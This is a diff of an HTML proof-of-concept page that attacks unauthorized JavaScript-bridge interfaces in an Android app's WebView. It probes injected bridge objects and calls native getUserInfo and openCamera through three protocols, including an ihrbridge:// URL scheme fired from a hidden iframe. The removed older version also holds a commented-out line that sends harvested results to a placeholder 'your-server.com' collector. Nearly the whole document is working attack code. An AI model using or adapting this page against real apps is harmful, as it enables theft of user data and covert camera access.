@@ -1,107 +1,312 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSBridge Test Page</title>
+    <title>JSBridge PoC v4 - Multi Protocol</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        button { font-size: 16px; padding: 10px; margin: 5px; cursor: pointer; }
-        #status { margin-top: 20px; font-weight: bold; }
+        body { font-family: sans-serif; padding: 12px; background: #f5f5f5; }
+        h3 { color: #333; margin-bottom: 15px; }
+        .section { 
+            background: white; 
+            padding: 12px; 
+            margin-bottom: 15px; 
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .section-title { 
+            font-weight: bold; 
+            color: #666; 
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        button { 
+            padding: 8px 16px; 
+            margin: 4px; 
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn-pluto { background: #4CAF50; color: white; }
+        .btn-irs { background: #2196F3; color: white; }
+        .btn-xfb { background: #FF9800; color: white; }
+        .btn-test { background: #9C27B0; color: white; }
+        pre {
+            border: 1px solid #ddd;
+            padding: 10px;
+            min-height: 150px;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            font-size: 12px;
+            border-radius: 4px;
+        }
+        .success { color: #4CAF50; }
+        .error { color: #f44336; }
+        .info { color: #2196F3; }
+        .warn { color: #FF9800; }
     </style>
-    <!-- 1. 引入 vConsole，这是关键！ -->
-    <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
 </head>
 <body>
-    <h1>JSBridge 漏洞测试页面</h1>
-    <p>如果页面下方出现绿色的 vConsole 按钮，说明环境已就绪。</p>
+<h3>🔓 JSBridge 未授权访问 PoC v4</h3>
 
-    <button onclick="testDirectCall()">测试直接调用 (e.g., getUserInfo)</button>
-    <button onclick="testUnifiedCall()">测试统一接口调用 (e.g., call)</button>
-    <button onclick="testPlutoGetUserInfo()">测试 Pluto.getUserInfo</button>
+<!-- 环境检测 -->
+<div class="section">
+    <div class="section-title">📱 环境检测</div>
+    <button class="btn-test" onclick="detectEnvironment()">检测 Bridge 环境</button>
+</div>
 
-    <div id="status">等待操作...</div>
+<!-- PLUTO 协议 (jsCallNative) -->
+<div class="section">
+    <div class="section-title">🟢 PLUTO 协议 - Android.jsCallNative()</div>
+    <button class="btn-pluto" onclick="pluto_getUserInfo()">getUserInfo</button>
+    <button class="btn-pluto" onclick="pluto_openCamera()">openCamera (预期失败)</button>
+</div>
 
-    <script>
-        // 2. 初始化 vConsole
-        var vConsole = new VConsole();
+<!-- IRS 协议 (URL Scheme) -->
+<div class="section">
+    <div class="section-title">🔵 IRS 协议 - ihrbridge:// URL Scheme</div>
+    <button class="btn-irs" onclick="irs_openCamera()">openCamera</button>
+    <button class="btn-irs" onclick="irs_getUserInfo()">getUserInfo</button>
+</div>
 
-        // 获取状态显示区域
-        const statusDiv = document.getElementById('status');
+<!-- XFB 协议 (H2C_JSBridge) -->
+<div class="section">
+    <div class="section-title">🟠 XFB 协议 - Android.H2C_JSBridge()</div>
+    <button class="btn-xfb" onclick="xfb_openCamera()">openCamera</button>
+    <button class="btn-xfb" onclick="xfb_getUserInfo()">getUserInfo</button>
+</div>
 
-        // 使用 vConsole.log 来输出，这样能在手机上看到
-        function log(msg) {
-            console.log(msg); // 也会输出到浏览器控制台
-            vConsole.log(msg); // 输出到 vConsole
+<!-- 日志区域 -->
+<div class="section">
+    <div class="section-title">📋 调用日志</div>
+    <button onclick="clearLog()" style="background:#666;color:white;font-size:12px;padding:4px 8px;">清空日志</button>
+    <pre id="log"></pre>
+</div>
+
+<script>
+    var callbackId = 0;
+
+    function log(msg, type) {
+        var el = document.getElementById('log');
+        var time = new Date().toLocaleTimeString();
+        var colorClass = type || '';
+        el.innerHTML += '<span class="' + colorClass + '">[' + time + '] ' + escapeHtml(msg) + '</span>\n';
+        el.scrollTop = el.scrollHeight;
+    }
+
+    function escapeHtml(text) {
+        var div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+
+    function clearLog() {
+        document.getElementById('log').innerHTML = '';
+    }
+
+    function getCallbackId() {
+        return 'cb_' + (++callbackId) + '_' + Date.now();
+    }
+
+    // ==================== 通用回调处理 ====================
+    
+    // PLUTO 协议的回调（通过 evaluateJavascript 注入）
+    window.nativeCallback = function(data) {
+        log('[PLUTO 回调] ' + JSON.stringify(data), 'success');
+    };
+
+    // IRS 协议的回调处理（Native 会调用 IrsJSBridge.handleMessageFormNative）
+    window.IrsJSBridge = window.IrsJSBridge || {};
+    window.IrsJSBridge.handleMessageFormNative = function(jsonStr) {
+        log('[IRS 回调] ' + jsonStr, 'success');
+        try {
+            var data = JSON.parse(jsonStr);
+            log('[IRS 解析] code=' + data.code + ', msg=' + data.msg, 'info');
+        } catch(e) {}
+    };
+
+    // XFB 协议的回调（通过 $C2H_JSBridge）
+    window.$C2H_JSBridge = function(data) {
+        log('[XFB 回调] ' + JSON.stringify(data), 'success');
+    };
+
+    // ==================== 环境检测 ====================
+    
+    function detectEnvironment() {
+        log('========== 环境检测开始 ==========', 'info');
+        
+        // 检测 Android bridge
+        if (window.Android) {
+            log('✅ window.Android 存在', 'success');
+            var methods = [];
+            for (var k in window.Android) {
+                methods.push(k);
+            }
+            log('   可用方法: ' + methods.join(', '), 'info');
+        } else {
+            log('❌ window.Android 不存在', 'error');
         }
 
-        // 3. 攻击代码：尝试不同的调用方式
-
-        // 方式一：如果方法直接挂在 Android 对象下
-        function testDirectCall() {
-            log("--- 尝试直接调用 ---");
-            if (window.Android && window.Android.getUserInfo) {
-                log("✅ 发现 window.Android.getUserInfo");
-                try {
-                    const result = window.Android.getUserInfo();
-                    log("🎉 调用成功！返回结果: " + JSON.stringify(result));
-                    statusDiv.innerText = "直接调用成功！请查看 vConsole。";
-                    // 将结果发送到你的服务器
-                    // new Image().src = 'https://your-server.com/collect?data=' + encodeURIComponent(JSON.stringify(result));
-                } catch (e) {
-                    log("❌ 调用失败: " + e);
-                    statusDiv.innerText = "直接调用失败。";
-                }
-            } else {
-                log("❌ 未发现 window.Android.getUserInfo");
-                statusDiv.innerText = "未发现直接调用的方法。";
+        // 检测 WebViewJavascriptBridge
+        if (window.WebViewJavascriptBridge) {
+            log('✅ window.WebViewJavascriptBridge 存在', 'success');
+            var methods = [];
+            for (var k in window.WebViewJavascriptBridge) {
+                methods.push(k);
             }
+            log('   可用方法: ' + methods.join(', '), 'info');
+        } else {
+            log('❌ window.WebViewJavascriptBridge 不存在', 'error');
         }
 
-        // 方式二：如果通过统一的 call 方法调用
-        function testUnifiedCall() {
-            log("--- 尝试统一接口调用 ---");
-            if (window.Android && window.Android.call) {
-                log("✅ 发现 window.Android.call");
-                try {
-                    // 假设 call 方法的签名是 call(pluginName, params, callback)
-                    // 我们尝试调用 Pluto 模块的 getUserInfo
-                    window.Android.call('getUserInfo', {}, function(result) {
-                        log("🎉 调用成功！返回结果: " + JSON.stringify(result));
-                        statusDiv.innerText = "统一接口调用成功！请查看 vConsole。";
-                    });
-                } catch (e) {
-                    log("❌ 调用失败: " + e);
-                    statusDiv.innerText = "统一接口调用失败。";
-                }
-            } else {
-                log("❌ 未发现 window.Android.call");
-                statusDiv.innerText = "未发现统一接口。";
-            }
+        // 检测 IrsJSBridge
+        if (window.IrsJSBridge) {
+            log('✅ window.IrsJSBridge 存在', 'success');
         }
 
-        // 方式三：针对 Pluto 模块的特定调用（基于你分析的插件名）
-        function testPlutoGetUserInfo() {
-             log("--- 尝试调用 Pluto.getUserInfo ---");
-            // 这种可能性较小，但可以尝试
-            if (window.Android && window.Android.Pluto && window.Android.Pluto.getUserInfo) {
-                 log("✅ 发现 window.Android.Pluto.getUserInfo");
-                 // ... 执行调用
-            } else {
-                 log("❌ 未发现 window.Android.Pluto.getUserInfo");
-            }
-        }
+        log('========== 环境检测完成 ==========', 'info');
+    }
 
-        // 页面加载时，先打印一下 window.Android 对象，看看里面有什么
-        window.onload = function() {
-            log("页面加载完成，开始检查 JSBridge 对象...");
-            if (window.Android) {
-                log("✅ 发现 window.Android 对象！");
-                log("内容: " + JSON.stringify(window.Android, null, 2));
-            } else {
-                log("❌ 未发现 window.Android 对象。此 WebView 可能未注入 JSBridge。");
+    // ==================== PLUTO 协议调用 ====================
+    
+    function pluto_getUserInfo() {
+        log('--- [PLUTO] 调用 getUserInfo ---', 'info');
+        try {
+            if (!window.Android || typeof Android.jsCallNative !== 'function') {
+                log('❌ Android.jsCallNative 不可用', 'error');
+                return;
             }
-        };
-    </script>
+            var payload = { method: 'getUserInfo', data: {} };
+            Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
+            log('✅ 已调用，等待回调...', 'info');
+        } catch (e) {
+            log('❌ 异常: ' + e, 'error');
+        }
+    }
+
+    function pluto_openCamera() {
+        log('--- [PLUTO] 调用 openCamera (预期会失败，因为openCamera是IRS类型) ---', 'warn');
+        try {
+            if (!window.Android || typeof Android.jsCallNative !== 'function') {
+                log('❌ Android.jsCallNative 不可用', 'error');
+                return;
+            }
+            var payload = { method: 'openCamera', data: {} };
+            Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
+            log('✅ 已调用，等待回调...', 'info');
+        } catch (e) {
+            log('❌ 异常: ' + e, 'error');
+        }
+    }
+
+    // ==================== IRS 协议调用 (URL Scheme) ====================
+    
+    function irs_openCamera() {
+        log('--- [IRS] 调用 openCamera (URL Scheme) ---', 'info');
+        try {
+            var cbId = getCallbackId();
+            // 格式: ihrbridge://callbackId/methodName?jsonParams
+            var params = JSON.stringify({
+                handlerName: 'openCamera',
+                isOpenAlbum: false  // 直接打开相机，不显示选择框
+            });
+            var url = 'ihrbridge://' + cbId + '/openCamera?' + params;
+            log('URL: ' + url, 'info');
+            
+            // 方式1: 通过 iframe 触发
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            setTimeout(function() {
+                document.body.removeChild(iframe);
+            }, 100);
+            
+            log('✅ URL Scheme 已触发，等待回调...', 'info');
+        } catch (e) {
+            log('❌ 异常: ' + e, 'error');
+        }
+    }
+
+    function irs_getUserInfo() {
+        log('--- [IRS] 调用 getUserInfo (URL Scheme) ---', 'info');
+        try {
+            var cbId = getCallbackId();
+            var params = JSON.stringify({ handlerName: 'getUserInfo' });
+            var url = 'ihrbridge://' + cbId + '/getUserInfo?' + params;
+            log('URL: ' + url, 'info');
+            
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            setTimeout(function() {
+                document.body.removeChild(iframe);
+            }, 100);
+            
+            log('✅ URL Scheme 已触发，等待回调...', 'info');
+        } catch (e) {
+            log('❌ 异常: ' + e, 'error');
+        }
+    }
+
+    // ==================== XFB 协议调用 ====================
+    
+    function xfb_openCamera() {
+        log('--- [XFB] 调用 openCamera (H2C_JSBridge) ---', 'info');
+        try {
+            if (!window.Android || typeof Android.H2C_JSBridge !== 'function') {
+                log('❌ Android.H2C_JSBridge 不可用', 'error');
+                return;
+            }
+            var cbId = getCallbackId();
+            var payload = {
+                name: 'openCamera',
+                param: JSON.stringify({ isOpenAlbum: false }),
+                cbID: cbId
+            };
+            Android.H2C_JSBridge(JSON.stringify(payload));
+            log('✅ 已调用，等待回调...', 'info');
+        } catch (e) {
+            log('❌ 异常: ' + e, 'error');
+        }
+    }
+
+    function xfb_getUserInfo() {
+        log('--- [XFB] 调用 getUserInfo (H2C_JSBridge) ---', 'info');
+        try {
+            if (!window.Android || typeof Android.H2C_JSBridge !== 'function') {
+                log('❌ Android.H2C_JSBridge 不可用', 'error');
+                return;
+            }
+            var cbId = getCallbackId();
+            var payload = {
+                name: 'getUserInfo',
+                param: JSON.stringify({}),
+                cbID: cbId
+            };
+            Android.H2C_JSBridge(JSON.stringify(payload));
+            log('✅ 已调用，等待回调...', 'info');
+        } catch (e) {
+            log('❌ 异常: ' + e, 'error');
+        }
+    }
+
+    // ==================== 页面初始化 ====================
+    
+    window.onload = function() {
+        log('========== 页面加载完成 ==========', 'info');
+        log('提示: 先点击"检测 Bridge 环境"查看可用接口', 'warn');
+        log('', '');
+        log('📋 三种协议说明:', 'info');
+        log('  🟢 PLUTO: Android.jsCallNative() - 仅支持PLUTO类型插件', 'info');
+        log('  🔵 IRS: ihrbridge:// URL Scheme - 支持IRS类型插件', 'info');
+        log('  🟠 XFB: Android.H2C_JSBridge() - 支持XFB类型插件', 'info');
+    };
+</script>
 </body>
 </html>
